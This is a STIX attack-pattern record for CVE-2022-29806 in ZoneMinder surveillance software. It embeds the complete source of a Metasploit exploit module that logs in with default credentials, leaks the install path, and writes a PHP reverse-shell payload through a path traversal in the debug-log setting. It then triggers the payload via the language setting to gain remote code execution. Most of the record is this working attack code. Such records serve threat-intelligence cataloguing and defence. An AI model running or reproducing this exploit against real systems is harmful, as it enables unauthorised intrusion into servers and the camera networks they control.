{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d869a164-66ef-4f44-9987-d90b887ed8c2",
    "created": "2024-08-14T17:12:30.276412Z",
    "modified": "2024-08-14T17:12:30.276416Z",
    "name": "ZoneMinder Language Settings Remote Code Execution",
    "description": " This module exploits arbitrary file write in debug log file option chained with a path traversal in language settings that leads to a remote code execution in ZoneMinder surveillance software versions before 1.36.13 and before 1.37.11  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/zoneminder_lang_exec.rb",
            "external_id": "zoneminder_lang_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-29806"
        },
        {
            "source_name": "reference",
            "url": "https://krastanoel.com/cve/2022-29806"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  prepend Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ZoneMinder Language Settings Remote Code Execution',\n        'Description' => %q{\n          This module exploits arbitrary file write in debug log file option\n          chained with a path traversal in language settings that leads to a\n          remote code execution in ZoneMinder surveillance software versions\n          before 1.36.13 and before 1.37.11\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'krastanoel' ], # Discovery and exploit\n        'References' => [\n          [ 'CVE', '2022-29806' ],\n          [ 'URL', 'https://krastanoel.com/cve/2022-29806']\n        ],\n        'Platform' => ['php'],\n        'Privileged' => false,\n        'Arch' => ARCH_PHP,\n        'Targets' => [\n          [ 'Automatic Target', {}]\n        ],\n        'DisclosureDate' => '2022-04-27',\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'Payload' => 'php/reverse_perl',\n          'Encoder' => 'php/base64'\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('USERNAME', [true, 'The ZoneMinder username', 'admin']),\n      OptString.new('PASSWORD', [true, 'The ZoneMinder password', 'admin']),\n      OptString.new('TARGETURI', [true, 'The ZoneMinder path', '/zm/'])\n    ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, '/index.php'),\n      'method' => 'GET'\n    )\n    return Exploit::CheckCode::Unknown('No response from the web service') if res.nil?\n    return Exploit::CheckCode::Safe(\"Check TARGETURI - unexpected HTTP response code: #{res.code}\") if res.code != 200\n\n    if res.body =~ /ZoneMinder/\n      csrf_magic = get_csrf_magic(res)\n      res = authenticate(csrf_magic) if res.body =~ /ZoneMinder Login/\n      return Exploit::CheckCode::Safe('Authentication failed') if res.body =~ %r{<title>ZM - Login</title>}\n\n      res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, '/index.php'),\n        'method' => 'GET',\n        'keep_cookies' => true\n      )\n    else\n      return Exploit::CheckCode::Safe('Target is not a ZoneMinder web server')\n    end\n\n    res.body.match(/v(1.\\d+.\\d+)/)\n    version = Regexp.last_match(1)\n    unless version\n      return Exploit::CheckCode::Safe('Unable to determine ZoneMinder version')\n    end\n\n    version = Rex::Version.new(version)\n\n    return Exploit::CheckCode::Appears(\"Version Detected: #{version}\") if version <= Rex::Version.new('1.37.10')\n\n    Exploit::CheckCode::Safe(\"Version Detected: #{version}\")\n  rescue ::Rex::ConnectionError\n    return Exploit::CheckCode::Unknown('Could not connect to the web service')\n  end\n\n  def exploit\n    unless datastore['AutoCheck']\n      cookie_jar.clear\n      res = authenticate\n      fail_with(Failure::NoAccess, 'Authentication failed') if res&.body =~ %r{<title>ZM - Login</title>}\n    end\n\n    vprint_status('Leak installation directory path')\n    random_path = rand_text_alphanumeric(6..15)\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, '/index.php'),\n      'method' => 'GET',\n      'keep_cookies' => true,\n      'vars_get' => { 'view' => random_path }\n    )\n\n    fail_with(Failure::UnexpectedReply, 'Failed to leak install path') unless res\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, '/index.php'),\n      'method' => 'GET',\n      'keep_cookies' => true,\n      'vars_get' => { 'view' => 'options' }\n    )\n\n    csrf_magic = get_csrf_magic(res)\n    current_lang = res&.get_html_document&.at(\n      'select[@name=\"newConfig[ZM_LANG_DEFAULT]\"]\n        option[@selected=\"selected\"]'\n    )&.text\n    fail_with(Failure::UnexpectedReply, 'Unable to get current language') if res.nil? || current_lang.nil?\n\n    data = 'view=request&request=log&task=query&limit=10'\n    data += \"&__csrf_magic=#{csrf_magic}\" if csrf_magic\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/index.php'),\n      'data' => data.to_s,\n      'keep_cookies' => true\n    )\n\n    fail_with(Failure::UnexpectedReply, 'Unable to get valid JSON response') if res.nil? || res&.body.blank?\n\n    res.body.match(/(\\{\"result\":.*})/)\n    request_log = JSON.parse(Regexp.last_match(1)).with_indifferent_access\n    if request_log.key?(:rows) # Check for latest version key first v1.36.x\n      request_log_key = 'rows'\n    elsif request_log.key?(:logs)\n      request_log_key = 'logs'\n    else\n      fail_with(Failure::UnexpectedReply, 'Service found, but unable to find request log key')\n    end\n\n    request_log = request_log[request_log_key].select { |e| e['Message'] =~ /'#{random_path}'/ }.first\n    if request_log\n      path = request_log['File'].split('/')[0..-2].join('/')\n      vprint_good(\"Path: #{path}\")\n    else\n      fail_with(Failure::UnexpectedReply, 'Service found, but unable to leak installation directory path')\n    end\n\n    fname = \"#{rand_text_alphanumeric(6..15)}.php\"\n    traverse_path = \"#{path}/lang\".split('/')[1..].map { '../' }.join\n    shell = \"#{traverse_path}tmp/#{fname}\"\n    data = \"view=options&tab=logging&action=options&newConfig[ZM_LOG_DEBUG]=1&newConfig[ZM_LOG_DEBUG_FILE]=#{shell}\"\n    data += \"&__csrf_magic=#{csrf_magic}\" if csrf_magic\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/index.php'),\n      'data' => data.to_s,\n      'keep_cookies' => true\n    )\n\n    fail_with(Failure::UnexpectedReply, 'Unable to set LOG_DEBUG_FILE option') if res.nil? || res&.code != 302\n    vprint_good(\"Shell: #{shell}\")\n\n    p = %(<?php #{payload.encoded} ?>)\n    data = \"view=request&request=log&task=create&level=ERR&message=#{p}&file=#{shell}\"\n    data += \"&__csrf_magic=#{csrf_magic}\" if csrf_magic\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/index.php'),\n      'data' => data.to_s,\n      'keep_cookies' => true\n    )\n\n    fail_with(Failure::UnexpectedReply, 'Failed to receive a response') unless res\n\n    result = JSON.parse(res.body)['result']\n    fail_with(Failure::UnexpectedReply, 'Failed to write payload') unless result\n    fail_with(Failure::UnexpectedReply, 'Unable to write payload to LOG_DEBUG_FILE') if result != 'Ok'\n\n    # trigger the shell\n    lang = shell.gsub(/\\.php/, '')\n    data = \"view=options&tab=system&action=options&newConfig[ZM_LANG_DEFAULT]=#{lang}\"\n    data += \"&__csrf_magic=#{csrf_magic}\" if csrf_magic\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/index.php'),\n      'data' => data.to_s,\n      'keep_cookies' => true\n    )\n    fail_with(Failure::UnexpectedReply, 'Unable to trigger the payload') if res.nil? || res&.code != 302\n\n    # cleanup\n    data = Rack::Utils.parse_nested_query(data)\n    data['newConfig']['ZM_LANG_DEFAULT'] = current_lang\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/index.php'),\n      'data' => data.to_query,\n      'keep_cookies' => true\n    )\n    vprint_warning('Unable to reset language to default') if res.nil? || res&.code != 200\n\n    data['tab'] = 'logging'\n    data['newConfig']['ZM_LOG_DEBUG'] = 0\n    data['newConfig']['ZM_LOG_DEBUG_FILE'] = ''\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/index.php'),\n      'data' => data.to_query,\n      'keep_cookies' => true\n    )\n    vprint_warning('Unable to reset debug option') if res.nil? || res&.code != 302\n  rescue ::Rex::ConnectionError\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n  end\n\n  private\n\n  def get_csrf_magic(res)\n    return if res.nil?\n\n    res.get_html_document.at('//input[@name=\"__csrf_magic\"]/@value')&.text\n  end\n\n  def authenticate(csrf_magic = nil)\n    username = datastore['USERNAME']\n    password = datastore['PASSWORD']\n    data = \"action=login&view=login&username=#{username}&password=#{password}\"\n    data += \"&__csrf_magic=#{csrf_magic}\" if csrf_magic\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/index.php'),\n      'data' => data.to_s,\n      'keep_cookies' => true\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-04-27",
    "x_mitre_platforms": [
        "['php']"
    ]
}